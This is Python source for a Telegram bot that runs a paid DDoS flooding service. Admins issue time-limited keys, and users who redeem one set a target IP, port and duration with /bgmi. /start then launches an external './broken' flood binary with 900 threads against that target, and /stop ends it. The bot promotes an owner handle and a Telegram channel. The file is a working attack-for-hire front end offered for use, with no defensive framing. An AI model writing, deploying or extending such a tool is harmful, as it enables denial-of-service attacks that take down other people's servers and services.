import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton

USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 900
users = {}
keys = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"KEY GENERATED\n\nYOUR KEY: {key}\n\nVALIDITY: {expiration_date}\n\nREDEEM YOUR KEY: /redeem"
            except ValueError:
                response = f"USAGE /genkey 1 HOURS and DAYS"
        else:
            response = "USAGE /genkey 1 HOURS and DAYS"
    else:
        response = "❌ ACCESS DENIED. CONTACT TO OWNER - @GODxAloneBOY"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"KEY REDEEMED SUCCESSFULLY"
        else:
            response = f"BOT OWNER - @GODxAloneBOY"
    else:
        response = f"USE COMMAND TO REDEEM KEY: /redeem"

    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ YOU ARE NOT AUTHORIZED. DM OWNER @GODxAloneBOY")
        return

    if len(context.args) != 3:
        await update.message.reply_text('EXAMPLE USE /bgmi «IP» «PORT» «DURATION»')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./broken', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'TARGET SET\n\nTARGET IP: {target_ip}\nPORT: {port}\nDURATION: {duration}\n\nTAP TO START ATTACK BUTTON')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("TAP TO COMMAND. /alone\n\nJOIN TELEGRAM - https://t.me/+03wLVBPurPk2NWRl")
        return

    if flooding_process is not None:
        await update.message.reply_text('ATTACK PENDING\n\nUSE COMMAND TO STOP /stop')
        return

    if flooding_command is None:
        await update.message.reply_text('USE COMMAND TO SET TARGET /alone\n\nCONTACT BOT OWNER- @GODxAloneBOY')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('ATTACK STARTED\nJOIN MY TELEGRAM CHANNEL\nSEND FEEDBACK TO OWNER @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("TAP TO COMMAND /alone\n\nJOIN MY TELEGRAM CHANNEL- https://t.me/+03wLVBPurPk2NWRl")
        return

    if flooding_process is None:
        await update.message.reply_text('ERROR. ATTACK IS NOT RUNNING')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('ATTACK STOPPED\n\nUSE COMMAND TO RESTART ATTACK /start')

# Update the alone_command function to include buttons
async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Create buttons
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
            [KeyboardButton("/stop")]
        ],
        resize_keyboard=False
    )
    
    response = (
        "ALL COMMANDS\n\n"
        "/genkey-> FOR GENERATE KEY\n"
        "/redeem-> FOR REDEEM KEY\n"
        "/bgmi-> FOR ATTACK TARGET SET\n"
        "/start-> FOR ATTACK START\n"
        "/stop-> FOR ATTACK STOP\n\n"
        f"✅OWNER-> {OWNER_USERNAME}"
    ) # Send message with the keyboard buttons
    await update.message.reply_text(response, reply_markup=markup)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("alone", alone_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()